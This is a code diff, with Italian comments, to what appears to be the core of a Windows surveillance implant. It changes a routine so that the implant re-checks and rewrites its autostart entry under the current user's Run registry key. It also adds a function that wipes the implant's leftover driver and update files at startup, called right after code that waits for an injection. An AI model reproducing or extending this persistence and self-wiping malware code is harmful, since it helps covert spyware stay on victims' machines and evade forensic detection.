@@ -1937,12 +1937,17 @@ void HM_InsertRegistryKey(char *dll_name, BOOL force_insert)
 	// Se vuole forzarla, non interessa vedere se c'e' gia'
 	if (!force_insert) {
 		DWORD ktype;
+		char value[MAX_PATH];
+		DWORD len = sizeof(value);
+		ZeroMemory(value, len);
 		// XXX-NEWREG
 		if (FNC(RegOpenKeyA)(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) {
-			if (FNC(RegQueryValueExA)(hOpen, REGISTRY_KEY_NAME, NULL, &ktype, NULL, NULL) == ERROR_SUCCESS) {
+			if (FNC(RegQueryValueExA)(hOpen, REGISTRY_KEY_NAME, NULL, &ktype, (BYTE *)value, &len) == ERROR_SUCCESS) {
 				// La chiave c'e' gia'
-				FNC(RegCloseKey)(hOpen);
-				return;
+				if (strstr(value, dll_name)) {
+					FNC(RegCloseKey)(hOpen);
+					return;
+				}
 			}
 			FNC(RegCloseKey)(hOpen);
 		}
@@ -2778,6 +2783,14 @@ void HM_CalcDateDelta(long long server_time, nanosec_time *delta)
 	delta->hi_delay = (DWORD)(delta_l >> 32);
 }
 
+void DeletePending()
+{
+	char d_file_path[MAX_PATH];
+	HM_WipeFileA(HM_CompletePath(H4DRIVER_NAME_ALT, d_file_path));
+	HM_WipeFileA(HM_CompletePath(H4DRIVER_NAME, d_file_path));
+	HM_WipeFileA(HM_CompletePath(H4_UPDATE_FILE, d_file_path));
+}
+
 // Main del core
 void __stdcall HM_sMain(void)
 {
@@ -2868,6 +2881,9 @@ void __stdcall HM_sMain(void)
 	REPORT_STATUS_LOG(ss6.get_str());
 	Sleep(3300); // XXX Aspetta che venga fatta l'injection prima di scrivere la chiave
 	HM_InsertRegistryKey(H4DLLNAME, FALSE);
+
+	// Cancella eventuali file pendenti vecchi e inutilizzati
+	DeletePending();
 
 	// Inizializza (dal file di configurazione) e fa partire gli agent
 	// e il thread di dispatch
